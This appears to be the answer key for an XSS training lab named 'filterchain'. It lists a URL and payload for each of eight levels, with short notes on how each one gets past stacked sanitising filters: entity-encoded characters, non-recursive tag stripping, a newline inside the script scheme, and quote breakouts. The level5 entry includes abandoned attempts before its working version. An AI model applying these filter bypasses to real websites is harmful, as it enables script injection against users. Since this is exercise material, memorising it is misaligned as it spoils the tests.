# filterchain — solutions

Multiple stacked filters (tag blacklist, event-handler regex, protocol strip, lowercase, quote strip, etc.) — each level needs a payload that bypasses the actual combined filter.

### filterchain-level1

`/filterchain/level1/?query=%3Cdetails%20open%20ontoggle=alert(1)%3E`

- payload: `<details open ontoggle=alert(1)>`
- context: blacklist strips script/img/svg/iframe/etc., but `<details>` is allowed

### filterchain-level2

`/filterchain/level2/?query=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/script%3E`

- payload: `<scr<script>ipt>alert(1)</script>`
- context: `strip_tags` is non-recursive; inner `<script>` removed leaves outer `<script>`

### filterchain-level3

`/filterchain/level3/?query=java%26%23x09;script:alert(1)`

- payload: `java&#x09;script:alert(1)`
- context: href; lowercase + `javascript:` strip — HTML entity tab breaks the literal match, browser still parses as `javascript:`

### filterchain-level4

`/filterchain/level4/?query=%27%20onmouseover=alert(1)%20x=%27`

- payload: `' onmouseover=alert(1) x='`
- context: single-quoted attr, angles encoded, `"` stripped — break out with `'`

### filterchain-level5

`/filterchain/level5/?query=%20onmouseover=alert%601%60%20x=`

- payload: ` onmouseover=alert\`1\` x=`
- context: angles/parens/backticks stripped — actually backticks stripped too, so use attribute breakout with quote: `" onmouseover=confirm\`1\` x="` won't work without parens/backticks. Use `" autofocus onfocus=alert\`1\` x="` — backtick blocked. Alternative: `" onclick=alert(1) x="` — parens blocked. Use throw-without-parens:

### filterchain-level5 (working)

`/filterchain/level5/?query=%22%20onmouseover=alert%26%23x28;1%26%23x29;%20x=%22`

- payload: `" onmouseover=alert&#x28;1&#x29; x="`
- context: parens/backticks/angles stripped; entity-encoded parens decode at parse time in attribute

### filterchain-level6

`/filterchain/level6/?query=Java%0aScript:alert(1)`

- payload: `Java\nScript:alert(1)`
- context: iframe src; `javascript:`/`data:`/`vbscript:` literal strip — embedded newline breaks the regex but browsers ignore it in the URL scheme

### filterchain-level7

`/filterchain/level7/?query=x%20onfocus=alert(1)%20autofocus`

- payload: `x onfocus=alert(1) autofocus`
- context: unquoted attr, angles/quotes stripped — inject new attributes via spaces

### filterchain-level8

`/filterchain/level8/?query=%27;alert(1);//`

- payload: `';alert(1);//`
- context: JS single-quoted string; `</script>` and `\` stripped but `'` not escaped
